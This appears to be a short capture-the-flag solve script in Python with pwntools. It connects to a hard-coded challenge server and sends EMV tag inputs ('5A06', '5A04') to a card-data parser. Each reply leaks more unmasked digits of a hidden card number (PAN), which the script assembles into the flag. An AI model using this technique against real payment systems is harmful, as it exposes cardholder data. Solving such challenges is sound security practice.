from pwn import *

# r = process('./main')
r = remote('18.119.52.238', 7001)

full_pan = b''

pan = r.recvline()
iin = r.recvline()
full_pan = pan.split(b': ')[1].strip().replace(b'X', b'')
r.recvuntil(b'Parser')
r.sendline(b'5A06')
r.recvuntil(b'format: \n')

pan = r.recvline()
full_pan = pan.split(b': ')[1].strip().replace(b'X', b'') + full_pan

r.sendline(b'5A04')
r.recvuntil(b'format: \n')

pan = r.recvline()
full_pan = pan.split(b': ')[1].strip().replace(b'X', b'') + full_pan

full_pan = iin.split(b': ')[1].strip()[:4] + full_pan
print('flag{' + full_pan.decode("utf-8") + '}')

r.close()